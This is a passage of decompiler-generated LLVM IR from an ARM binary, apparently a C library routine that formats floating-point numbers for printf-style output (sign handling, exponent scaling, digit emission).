  %tmp = fptrunc double %arg2 to float
  %tmp160 = bitcast float %tmp to i32
  store i32 %tmp160, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg4, i32* %stack_var_0, align 4
  %stack_var_-46 = alloca i8, align 1
  %stack_var_-164 = alloca i32, align 4
  %stack_var_-47 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-42 = alloca i32, align 4
  %stack_var_-82 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-83 = alloca i32, align 4
  %stack_var_-81 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-208 = alloca i32, align 4
  %v27_13228 = load i32, i32* @lr, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v1_13234 = add i32 %arg4, 8
  %v2_13234 = inttoptr i32 %v1_13234 to i8*
  %v3_13234 = load i8, i8* %v2_13234, align 1
  %v4_13234 = zext i8 %v3_13234 to i32
  store i32 %v4_13234, i32* %sb.global-to-local, align 4
  %v1_13238 = or i32 %v4_13234, 32
  %v7_1323c = icmp eq i32 %v1_13238, 97
  store i1 %v7_1323c, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg4, i32* %r0.global-to-local, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v1_13254 = inttoptr i32 %arg4 to i32*
  %v2_13254 = load i32, i32* %v1_13254, align 4
  store i32 %v2_13254, i32* %fp.global-to-local, align 4
  store i32 %arg4, i32* %lr.global-to-local, align 4
  %v0_1325c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_1325c, i32* %r6.global-to-local, align 4
  store i32 69000, i32* %ip.global-to-local, align 4
  br i1 %v7_1323c, label %bb, label %bb201

bb:                                               ; preds = %entry
  %v2_13264 = add nuw nsw i32 %v4_13234, 6
  store i32 %v2_13264, i32* %r3.global-to-local, align 4
  br label %bb201

bb201:                                            ; preds = %entry, %bb
  %v1_13274 = phi i32 [ %v0_1325c, %entry ], [ %v2_13264, %bb ]
  store i32 %tmp160, i32* %r5.global-to-local, align 4
  %v1_1326c = add i32 %arg4, 12
  %v2_1326c = inttoptr i32 %v1_1326c to i32*
  %v3_1326c = load i32, i32* %v2_1326c, align 4
  store i32 %v3_1326c, i32* %r2.global-to-local, align 4
  %v1_13270 = add i32 %arg4, 4
  %v2_13270 = inttoptr i32 %v1_13270 to i32*
  %v3_13270 = load i32, i32* %v2_13270, align 4
  store i32 %v3_13270, i32* @lr, align 4
  br i1 %v7_1323c, label %bb202, label %bb203

bb202:                                            ; preds = %bb201
  %v2_13274 = urem i32 %v1_13274, 256
  store i32 %v2_13274, i32* %sb.global-to-local, align 4
  br label %bb203

bb203:                                            ; preds = %bb201, %bb202
  %v1_13278 = icmp slt i32 %v2_13254, 0
  %v2_13278 = icmp eq i32 %v2_13254, 0
  store i1 %v2_13278, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24010.405 to i32), i32* %ip.global-to-local, align 4
  br i1 %v1_13278, label %bb204, label %bb205

bb204:                                            ; preds = %bb203
  store i32 6, i32* %fp.global-to-local, align 4
  br label %bb205

bb205:                                            ; preds = %bb203, %bb204
  %v1_13288 = and i32 %v3_1326c, 2
  %v2_13288 = icmp eq i32 %v1_13288, 0
  store i1 %v2_13288, i1* %cpsr_z.global-to-local, align 1
  store i8 0, i8* %stack_var_-46, align 1
  br i1 %v2_13288, label %dec_label_pc_132a0, label %dec_label_pc_132ac

dec_label_pc_132a0:                               ; preds = %bb205
  %v1_132a0 = urem i32 %v3_1326c, 2
  %v2_132a0 = icmp eq i32 %v1_132a0, 0
  store i1 %v2_132a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_132a0, label %dec_label_pc_132b0, label %dec_label_pc_132ac

dec_label_pc_132ac:                               ; preds = %dec_label_pc_132a0, %bb205
  %storemerge = phi i32 [ 43, %bb205 ], [ 32, %dec_label_pc_132a0 ]
  %v0_132ac.off0 = phi i8 [ 43, %bb205 ], [ 32, %dec_label_pc_132a0 ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  store i8 %v0_132ac.off0, i8* %stack_var_-46, align 1
  br label %dec_label_pc_132b0

dec_label_pc_132b0:                               ; preds = %dec_label_pc_132a0, %dec_label_pc_132ac
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 %v0_1325c, i32* %r3.global-to-local, align 4
  store i32 %tmp160, i32* @r0, align 4
  store i32 %v0_1325c, i32* %r1.global-to-local, align 4
  store i32 %tmp160, i32* @r2, align 4
  %v1_132cc = fptrunc double %arg2 to float
  %v2_132cc = bitcast float %v1_132cc to i32
  %v9_132cc = call i32 @__aeabi_dcmpeq(i32 %v2_132cc, i32 %v0_1325c, i32 %v2_132cc, i32 %v0_1325c, i32 0)
  store i32 %v9_132cc, i32* %r0.global-to-local, align 4
  %v2_132d0 = icmp eq i32 %v9_132cc, 0
  store i1 %v2_132d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_132d0, label %bb207, label %dec_label_pc_132e0

bb207:                                            ; preds = %dec_label_pc_132b0
  store i32 8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_13394

dec_label_pc_132e0:                               ; preds = %dec_label_pc_132b0
  %v0_132e0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_132e0, i32* @r0, align 4
  %v0_132e4 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_132e4, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v7_132f0 = call i32 @__aeabi_dcmpeq(i32 %v0_132e0, i32 %v0_132e4, i32 0, i32 0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v7_132f0, i32* %r0.global-to-local, align 4
  %v2_132f4 = icmp eq i32 %v7_132f0, 0
  store i1 %v2_132f4, i1* %cpsr_z.global-to-local, align 1
  %v0_1333c = load i32, i32* %r5.global-to-local, align 4
  %v1_1333c = sext i32 %v0_1333c to i64
  %v2_1333c = bitcast i64 %v1_1333c to double
  br i1 %v2_132f4, label %dec_label_pc_1333c, label %dec_label_pc_132fc

dec_label_pc_132fc:                               ; preds = %dec_label_pc_132e0
  store i32 1072693248, i32* %r1.global-to-local, align 4
  %v9_1330c = fdiv double 0.000000e+00, %v2_1333c
  %v10_1330c = fptrunc double %v9_1330c to float
  %v11_1330c = bitcast float %v10_1330c to i32
  store i32 %v11_1330c, i32* @r0, align 4
  store i32 0, i32* @r2, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v4_13318 = call i32 @__aeabi_dcmplt(i32 %v11_1330c, i32 1072693248, i32 0, i32 0)
  store i32 %v4_13318, i32* %r0.global-to-local, align 4
  %v2_1331c = icmp eq i32 %v4_13318, 0
  store i1 %v2_1331c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1331c, label %bb208, label %dec_label_pc_13328

bb208:                                            ; preds = %dec_label_pc_132fc
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13508

dec_label_pc_13328:                               ; preds = %dec_label_pc_132fc
  store i32 45, i32* %r3.global-to-local, align 4
  store i8 45, i8* %stack_var_-46, align 1
  br label %dec_label_pc_13508

dec_label_pc_1333c:                               ; preds = %dec_label_pc_132e0
  store i32 %v0_1333c, i32* @r0, align 4
  %v0_13340 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_13340, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1334c = fptrunc double %v2_1333c to float
  %v2_1334c = bitcast float %v1_1334c to i32
  %v6_1334c = call i32 @__aeabi_dcmplt(i32 %v2_1334c, i32 %v0_13340, i32 0, i32 0)
  store i32 %v6_1334c, i32* %r0.global-to-local, align 4
  %v2_13350 = icmp eq i32 %v6_1334c, 0
  store i1 %v2_13350, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13350, label %dec_label_pc_1333c..thread9_crit_edge, label %bb209

dec_label_pc_1333c..thread9_crit_edge:            ; preds = %dec_label_pc_1333c
  %v0_13370.pre = load i32, i32* %r6.global-to-local, align 4
  br label %.thread9

bb209:                                            ; preds = %dec_label_pc_1333c
  store i32 45, i32* %r2.global-to-local, align 4
  %v1_13358 = load i32, i32* %r6.global-to-local, align 4
  %v2_13358 = sub i32 0, %v1_13358
  store i32 %v2_13358, i32* %r4.global-to-local, align 4
  store i8 45, i8* %stack_var_-46, align 1
  store i32 %v2_13358, i32* %r6.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_1333c..thread9_crit_edge, %bb209
  %v0_13370 = phi i32 [ %v0_13370.pre, %dec_label_pc_1333c..thread9_crit_edge ], [ %v2_13358, %bb209 ]
  %v0_1336c = load i32, i32* %r5.global-to-local, align 4
  %v1_1336c = sext i32 %v0_1336c to i64
  %v2_1336c = bitcast i64 %v1_1336c to double
  %v9_13374 = fmul double %v2_1336c, 0.000000e+00
  %v10_13374 = fptrunc double %v9_13374 to float
  %v11_13374 = bitcast float %v10_13374 to i32
  store i32 %v11_13374, i32* @r2, align 4
  store i32 %v0_13370, i32* %r3.global-to-local, align 4
  store i32 %v0_1336c, i32* @r0, align 4
  store i32 %v0_13370, i32* %r1.global-to-local, align 4
  %v7_13388 = call i32 @__aeabi_dcmpeq(i32 %v0_1336c, i32 %v0_13370, i32 %v11_13374, i32 %v0_13370, i32 ptrtoint (i32* @0 to i32))
  store i32 %v7_13388, i32* %r0.global-to-local, align 4
  %v2_1338c = icmp eq i32 %v7_13388, 0
  store i1 %v2_1338c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1338c, label %dec_label_pc_133e0, label %.thread9.dec_label_pc_13394_crit_edge

.thread9.dec_label_pc_13394_crit_edge:            ; preds = %.thread9
  %v3_13394.pre = load i32, i32* %stack_var_0, align 4
  br label %dec_label_pc_13394

dec_label_pc_13394:                               ; preds = %bb207, %.thread9.dec_label_pc_13394_crit_edge
  %v3_13394 = phi i32 [ %v3_13394.pre, %.thread9.dec_label_pc_13394_crit_edge ], [ %arg4, %bb207 ]
  %v1_132d8.v0_132c45 = phi i32 [ 0, %.thread9.dec_label_pc_13394_crit_edge ], [ 8, %bb207 ]
  store i32 %v3_13394, i32* %ip.global-to-local, align 4
  %v2_1339c = add i32 %v3_13394, 16
  %v3_1339c = inttoptr i32 %v2_1339c to i32*
  store i32 32, i32* %v3_1339c, align 4
  %v0_133a4 = load i32, i32* %sb.global-to-local, align 4
  %v7_133a4 = icmp eq i32 %v0_133a4, 96
  store i1 %v7_133a4, i1* %cpsr_z.global-to-local, align 1
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 3, i32* %stack_var_-164, align 4
  %tmp274 = icmp ult i32 %v0_133a4, 97
  br i1 %tmp274, label %bb210, label %.thread124

bb210:                                            ; preds = %dec_label_pc_13394
  %v5_133b8 = or i32 %v1_132d8.v0_132c45, 4
  store i32 %v5_133b8, i32* %r3.global-to-local, align 4
  br label %.thread124

.thread124:                                       ; preds = %dec_label_pc_13394, %bb210
  %v4_133bc = phi i32 [ %v5_133b8, %bb210 ], [ 3, %dec_label_pc_13394 ]
  %v4_133bc.v1_132d8.v0_132c4 = select i1 %tmp274, i32 %v4_133bc, i32 %v1_132d8.v0_132c45
  store i32 ptrtoint (i32* @global_var_24010.405 to i32), i32* %lr.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 -34128), i32* %r3.global-to-local, align 4
  %v2_133d0 = add i32 %v4_133bc.v1_132d8.v0_132c4, add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 -34128)
  store i32 %v2_133d0, i32* %r2.global-to-local, align 4
  %v2_133d4 = ptrtoint i32* %stack_var_-156 to i32
  store i32 %v2_133d4, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_138fc

dec_label_pc_133e0:                               ; preds = %.thread9
  %v0_133e0 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_133e0, i32* %r1.global-to-local, align 4
  store i32 1100470148, i32* %r3.global-to-local, align 4
  %v0_133e8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_133e8, i32* @r0, align 4
  store i32 0, i32* @r2, align 4
  %v6_133f0 = call i32 @__aeabi_dcmplt(i32 %v0_133e8, i32 %v0_133e0, i32 0, i32 1100470148)
  store i32 %v6_133f0, i32* %r0.global-to-local, align 4
  %v2_133f4 = icmp eq i32 %v6_133f0, 0
  store i1 %v2_133f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_133f4, label %bb212, label %bb211

bb211:                                            ; preds = %dec_label_pc_133e0
  store i32 1, i32* %r0.global-to-local, align 4
  br label %bb212

bb212:                                            ; preds = %dec_label_pc_133e0, %bb211
  %v0_133fc = phi i32 [ 0, %dec_label_pc_133e0 ], [ 1, %bb211 ]
  store i32 ptrtoint (i32* @global_var_24010.405 to i32), i32* %r0.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 -34104), i32* %r3.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 -34104), i32* %stack_var_-208, align 4
  store i32 9, i32* %sl.global-to-local, align 4
  store i32 256, i32* %r4.global-to-local, align 4
  %v2_13430 = icmp eq i32 %v0_133fc, 0
  br label %dec_label_pc_13420

dec_label_pc_13420:                               ; preds = %dec_label_pc_134b8.dec_label_pc_13420_crit_edge, %bb212
  %v2_13428 = phi i32 [ add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 -34104), %bb212 ], [ %v2_13428.pre, %dec_label_pc_134b8.dec_label_pc_13420_crit_edge ]
  %v0_13424 = phi i32 [ 9, %bb212 ], [ %v0_134b8, %dec_label_pc_134b8.dec_label_pc_13420_crit_edge ]
  %v2_13468 = phi i32 [ 8, %bb212 ], [ %stack_var_-192.3, %dec_label_pc_134b8.dec_label_pc_13420_crit_edge ]
  store i32 %v0_133fc, i32* %r2.global-to-local, align 4
  %v1_13424 = add i32 %v0_13424, -1
  store i32 %v1_13424, i32* %sl.global-to-local, align 4
  store i32 %v2_13428, i32* @lr, align 4
  %v3_1342c = mul i32 %v1_13424, 8
  store i32 %v3_1342c, i32* %r3.global-to-local, align 4
  store i1 %v2_13430, i1* %cpsr_z.global-to-local, align 1
  %v0_13434 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13434, i32* %r0.global-to-local, align 4
  %v0_13438 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_13438, i32* %r1.global-to-local, align 4
  %v2_1343c = add i32 %v3_1342c, %v2_13428
  store i32 %v2_1343c, i32* %ip.global-to-local, align 4
  %v1_13478 = inttoptr i32 %v2_1343c to i32*
  %v2_13478 = load i32, i32* %v1_13478, align 4
  %v3_13478 = sext i32 %v2_13478 to i64
  %v1_1347c = sext i32 %v0_13434 to i64
  %v2_1347c = bitcast i64 %v1_1347c to double
  br i1 %v2_13430, label %dec_label_pc_13478, label %dec_label_pc_13444

dec_label_pc_13444:                               ; preds = %dec_label_pc_13420
  %v8_13448 = bitcast i64 %v3_13478 to double
  %v9_13448 = fmul double %v2_1347c, %v8_13448
  %v10_13448 = fptrunc double %v9_13448 to float
  %v11_13448 = bitcast float %v10_13448 to i32
  store i32 %v11_13448, i32* @r0, align 4
  store i32 0, i32* @r2, align 4
  store i32 1104006501, i32* %r3.global-to-local, align 4
  store i32 %v11_13448, i32* %r7.global-to-local, align 4
  store i32 %v0_13438, i32* %r8.global-to-local, align 4
  %v4_1345c = call i32 @__aeabi_dcmplt(i32 %v11_13448, i32 %v0_13438, i32 0, i32 1104006501)
  store i32 %v4_1345c, i32* %r0.global-to-local, align 4
  %v2_13460 = icmp eq i32 %v4_1345c, 0
  store i1 %v2_13460, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13460, label %dec_label_pc_134b8, label %.thread10

.thread10:                                        ; preds = %dec_label_pc_13444
  %v1_13468 = load i32, i32* %r4.global-to-local, align 4
  %v3_13468 = sub i32 %v2_13468, %v1_13468
  store i32 %v3_13468, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_134b0

dec_label_pc_13478:                               ; preds = %dec_label_pc_13420
  store i32 %v0_13438, i32* @r1, align 4
  %v8_13484 = bitcast i64 %v3_13478 to double
  %v9_13484 = fdiv double %v2_1347c, %v8_13484
  %v10_13484 = fptrunc double %v9_13484 to float
  %v11_13484 = bitcast float %v10_13484 to i32
  store i32 %v11_13484, i32* @r0, align 4
  store i32 0, i32* @r2, align 4
  store i32 1100470148, i32* @r3, align 4
  store i32 %v11_13484, i32* %r7.global-to-local, align 4
  store i32 %v0_13438, i32* %r8.global-to-local, align 4
  %v4_13498 = call i32 @__aeabi_dcmpge(i32 %v11_13484, i32 %v0_13438, i32 0, i32 1100470148)
  store i32 %v4_13498, i32* %r0.global-to-local, align 4
  %v2_1349c = icmp eq i32 %v4_13498, 0
  store i1 %v2_1349c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1349c, label %dec_label_pc_134b8, label %dec_label_pc_134a4

dec_label_pc_134a4:                               ; preds = %dec_label_pc_13478
  %v1_134a8 = load i32, i32* %r4.global-to-local, align 4
  %v2_134a8 = add i32 %v1_134a8, %v2_13468
  store i32 %v2_134a8, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_134b0

dec_label_pc_134b0:                               ; preds = %.thread10, %dec_label_pc_134a4
  %stack_var_-192.2 = phi i32 [ %v2_134a8, %dec_label_pc_134a4 ], [ %v3_13468, %.thread10 ]
  %v0_134b0 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_134b0, i32* %r5.global-to-local, align 4
  %v0_134b4 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_134b4, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_134b8

dec_label_pc_134b8:                               ; preds = %dec_label_pc_13444, %dec_label_pc_13478, %dec_label_pc_134b0
  %stack_var_-192.3 = phi i32 [ %v2_13468, %dec_label_pc_13478 ], [ %stack_var_-192.2, %dec_label_pc_134b0 ], [ %v2_13468, %dec_label_pc_13444 ]
  %v0_134b8 = load i32, i32* %sl.global-to-local, align 4
  %v2_134b8 = icmp eq i32 %v0_134b8, 0
  store i1 %v2_134b8, i1* %cpsr_z.global-to-local, align 1
  %v0_134bc = load i32, i32* %r4.global-to-local, align 4
  %v3_134bc = sdiv i32 %v0_134bc, 2
  store i32 %v3_134bc, i32* %r4.global-to-local, align 4
  br i1 %v2_134b8, label %dec_label_pc_134c4, label %dec_label_pc_134b8.dec_label_pc_13420_crit_edge

dec_label_pc_134b8.dec_label_pc_13420_crit_edge:  ; preds = %dec_label_pc_134b8
  %v2_13428.pre = load i32, i32* %stack_var_-208, align 4
  br label %dec_label_pc_13420

dec_label_pc_134c4:                               ; preds = %dec_label_pc_134b8
  %v0_134c4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_134c4, i32* @r0, align 4
  %v0_134c8 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_134c8, i32* @r1, align 4
  store i32 0, i32* @r2, align 4
  store i32 1104006501, i32* @r3, align 4
  %v6_134d4 = call i32 @__aeabi_dcmpge(i32 %v0_134c4, i32 %v0_134c8, i32 0, i32 1104006501)
  store i32 %v6_134d4, i32* %r0.global-to-local, align 4
  %v2_134d8 = icmp eq i32 %v6_134d4, 0
  store i1 %v2_134d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_134d8, label %dec_label_pc_13508, label %dec_label_pc_134e0

dec_label_pc_134e0:                               ; preds = %dec_label_pc_134c4
  %v0_134e0 = load i32, i32* %r5.global-to-local, align 4
  %v1_134e0 = sext i32 %v0_134e0 to i64
  %v2_134e0 = bitcast i64 %v1_134e0 to double
  %v0_134e4 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_134e4, i32* %r1.global-to-local, align 4
  store i32 1076101120, i32* %r3.global-to-local, align 4
  %v9_134f0 = fdiv double %v2_134e0, 0.000000e+00
  %v10_134f0 = fptrunc double %v9_134f0 to float
  %v11_134f0 = bitcast float %v10_134f0 to i32
  store i32 %v11_134f0, i32* %r0.global-to-local, align 4
  store i32 %v11_134f0, i32* %r5.global-to-local, align 4
  %v1_13500 = add i32 %stack_var_-192.3, 1
  store i32 %v1_13500, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13508

dec_label_pc_13508:                               ; preds = %dec_label_pc_134e0, %bb208, %dec_label_pc_134c4, %dec_label_pc_13328
  %stack_var_-192.4 = phi i32 [ %stack_var_-192.3, %dec_label_pc_134c4 ], [ -1, %dec_label_pc_13328 ], [ -1, %bb208 ], [ %v1_13500, %dec_label_pc_134e0 ]
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_1350c = ptrtoint i32* %stack_var_-81 to i32
  store i32 %v2_1350c, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_13510

dec_label_pc_13510:                               ; preds = %dec_label_pc_13588, %dec_label_pc_13508
  %v0_13510 = load i32, i32* %r6.global-to-local, align 4
  %v0_13514 = load i32, i32* %r5.global-to-local, align 4
  %v1_13518 = sext i32 %v0_13514 to i64
  %v2_13518 = bitcast i64 %v1_13518 to double
  %v3_13518 = fptoui double %v2_13518 to i32
  store i32 %v3_13518, i32* %r8.global-to-local, align 4
  store i32 %v3_13518, i32* %r2.global-to-local, align 4
  store i32 %v0_13510, i32* %r3.global-to-local, align 4
  store i32 %v0_13514, i32* @r0, align 4
  store i32 %v0_13510, i32* %r1.global-to-local, align 4
  %v6_13534 = call i32 @__aeabi_dsub(i32 %v0_13514, i32 %v0_13510, i32 %v3_13518, i32 %v0_13510)
  %v7_13534 = sext i32 %v6_13534 to i64
  %v8_13534 = bitcast i64 %v7_13534 to double
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 1104006501, i32* %r3.global-to-local, align 4
  %v9_13540 = fmul double %v8_13534, 0.000000e+00
  %v10_13540 = fptrunc double %v9_13540 to float
  %v11_13540 = bitcast float %v10_13540 to i32
  store i32 %v11_13540, i32* %r0.global-to-local, align 4
  %v0_13544 = load i32, i32* %sl.global-to-local, align 4
  %v1_13544 = add i32 %v0_13544, 9
  store i32 %v1_13544, i32* %sl.global-to-local, align 4
  store i32 %v11_13540, i32* %r5.global-to-local, align 4
  store i32 %v0_13510, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v0_13554.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_13554

dec_label_pc_13554:                               ; preds = %dec_label_pc_13554.dec_label_pc_13554_crit_edge, %dec_label_pc_13510
  %v1_13568 = phi i32 [ %v1_13568.pre, %dec_label_pc_13554.dec_label_pc_13554_crit_edge ], [ %v1_13544, %dec_label_pc_13510 ]
  %v0_13560 = phi i32 [ %v0_1357c, %dec_label_pc_13554.dec_label_pc_13554_crit_edge ], [ 0, %dec_label_pc_13510 ]
  %v0_1356c = phi i32 [ %v2_13578, %dec_label_pc_13554.dec_label_pc_13554_crit_edge ], [ %v0_13554.pre, %dec_label_pc_13510 ]
  %v3_1355c = urem i32 %v0_1356c, 10
  %v1_13560 = add i32 %v0_13560, 1
  store i32 %v1_13560, i32* %r7.global-to-local, align 4
  %v1_13564 = or i32 %v3_1355c, 48
  store i32 %v1_13564, i32* %r2.global-to-local, align 4
  %v2_13568 = sub i32 %v1_13568, %v1_13560
  store i32 %v2_13568, i32* %r3.global-to-local, align 4
  store i32 %v0_1356c, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v1_13574 = trunc i32 %v1_13564 to i8
  %v3_13574 = inttoptr i32 %v2_13568 to i8*
  store i8 %v1_13574, i8* %v3_13574, align 1
  %v0_13578 = load i32, i32* %r0.global-to-local, align 4
  %v1_13578 = load i32, i32* %r1.global-to-local, align 4
  %v2_13578 = udiv i32 %v0_13578, %v1_13578
  store i32 %v2_13578, i32* %r0.global-to-local, align 4
  %v0_1357c = load i32, i32* %r7.global-to-local, align 4
  %v7_1357c = icmp eq i32 %v0_1357c, 8
  store i1 %v7_1357c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_13578, i32* %r8.global-to-local, align 4
  %v7_13584 = icmp slt i32 %v0_1357c, 9
  br i1 %v7_13584, label %dec_label_pc_13554.dec_label_pc_13554_crit_edge, label %dec_label_pc_13588

dec_label_pc_13554.dec_label_pc_13554_crit_edge:  ; preds = %dec_label_pc_13554
  %v1_13568.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_13554

dec_label_pc_13588:                               ; preds = %dec_label_pc_13554
  %v0_13588 = load i32, i32* %r4.global-to-local, align 4
  %v1_13588 = add i32 %v0_13588, 1
  store i32 %v1_13588, i32* %r4.global-to-local, align 4
  %v7_1358c = icmp eq i32 %v0_13588, 0
  store i1 %v7_1358c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1358c, label %dec_label_pc_13510, label %dec_label_pc_13594

dec_label_pc_13594:                               ; preds = %dec_label_pc_13588
  %v0_13594 = load i32, i32* %sb.global-to-local, align 4
  %v7_13594 = icmp eq i32 %v0_13594, 96
  store i1 %v7_13594, i1* %cpsr_z.global-to-local, align 1
  %tmp275 = icmp ult i32 %v0_13594, 97
  br i1 %tmp275, label %bb213, label %thread-pre-split

bb213:                                            ; preds = %dec_label_pc_13594
  %v5_135a4 = add i32 %v0_13594, 32
  store i32 %v5_135a4, i32* %r3.global-to-local, align 4
  %v5_135a8 = urem i32 %v5_135a4, 256
  store i32 %v5_135a8, i32* %sb.global-to-local, align 4
  br label %bb214

thread-pre-split:                                 ; preds = %dec_label_pc_13594
  %v4_135a0.pre129134 = load i32, i32* %r3.global-to-local, align 4
  %phitmp = urem i32 %v4_135a0.pre129134, 256
  br label %bb214

bb214:                                            ; preds = %thread-pre-split, %bb213
  %v4_135a0126130 = phi i32 [ %phitmp, %thread-pre-split ], [ 69, %bb213 ]
  %v0_135c8 = phi i32 [ %v0_13594, %thread-pre-split ], [ %v5_135a8, %bb213 ]
  %v7_135ac = icmp eq i32 %v0_135c8, 103
  %. = zext i1 %v7_135ac to i32
  store i32 %., i32* %r3.global-to-local, align 4
  %v0_135b8 = load i32, i32* %fp.global-to-local, align 4
  %v2_135b8 = icmp eq i32 %v0_135b8, 0
  store i1 %v2_135b8, i1* %cpsr_z.global-to-local, align 1
  %tmp217 = icmp slt i32 %v0_135b8, 1
  br i1 %tmp217, label %.thread16, label %bb218

.thread16:                                        ; preds = %bb214
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %bb220

bb218:                                            ; preds = %bb214
  %v2_135c0 = icmp eq i1 %v7_135ac, false
  store i1 %v2_135c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_135c0, label %bb220, label %bb219

bb219:                                            ; preds = %bb218
  %v2_135c4 = add i32 %v0_135b8, -1
  store i32 %v2_135c4, i32* %fp.global-to-local, align 4
  br label %bb220

bb220:                                            ; preds = %.thread16, %bb218, %bb219
  %v0_135d8 = phi i32 [ %v0_135b8, %.thread16 ], [ %v0_135b8, %bb218 ], [ %v2_135c4, %bb219 ]
  %v7_135c8 = icmp eq i32 %v0_135c8, 102
  store i1 %v7_135c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_135c8, label %dec_label_pc_135d4, label %bb221

bb221:                                            ; preds = %bb220
  store i32 %v0_135d8, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_135fc

dec_label_pc_135d4:                               ; preds = %bb220
  store i32 %stack_var_-192.4, i32* %r3.global-to-local, align 4
  %v2_135d8 = add i32 %v0_135d8, %stack_var_-192.4
  store i32 %v2_135d8, i32* %ip.global-to-local, align 4
  %v8_135dc = icmp eq i32 %v2_135d8, -1
  store i1 %v8_135dc, i1* %cpsr_z.global-to-local, align 1
  %v6_135e0 = icmp slt i32 %v2_135d8, -1
  br i1 %v6_135e0, label %dec_label_pc_135e4, label %dec_label_pc_135fc

dec_label_pc_135e4:                               ; preds = %dec_label_pc_135d4
  %v2_135e4 = ptrtoint i32* %stack_var_-83 to i32
  store i32 %v2_135e4, i32* %r0.global-to-local, align 4
  store i32 48, i32* %r1.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  %v3_135f0 = bitcast i32* %stack_var_-83 to i8*
  %v4_135f0 = call i32 @__GI_memset(i8* %v3_135f0, i32 48, i32 17)
  store i32 %v4_135f0, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_135fc

dec_label_pc_135fc:                               ; preds = %bb221, %dec_label_pc_135d4, %dec_label_pc_135e4
  %v1_1364092 = phi i32 [ %v4_135f0, %dec_label_pc_135e4 ], [ %v2_13578, %dec_label_pc_135d4 ], [ %v2_13578, %bb221 ]
  %v1_13624 = phi i32 [ -1, %dec_label_pc_135e4 ], [ %v2_135d8, %dec_label_pc_135d4 ], [ %v0_135d8, %bb221 ]
  %stack_var_-192.5 = phi i32 [ -1, %dec_label_pc_135e4 ], [ %stack_var_-192.4, %dec_label_pc_135d4 ], [ %stack_var_-192.4, %bb221 ]
  %v1_13600 = add i32 %v1_13624, -16
  %v3_13600 = sub i32 15, %v1_13624
  %v4_13600 = and i32 %v3_13600, %v1_13624
  %v5_13600 = icmp slt i32 %v4_13600, 0
  %v6_13600 = icmp slt i32 %v1_13600, 0
  %v7_13600 = icmp eq i32 %v1_13624, 16
  store i1 %v7_13600, i1* %cpsr_z.global-to-local, align 1
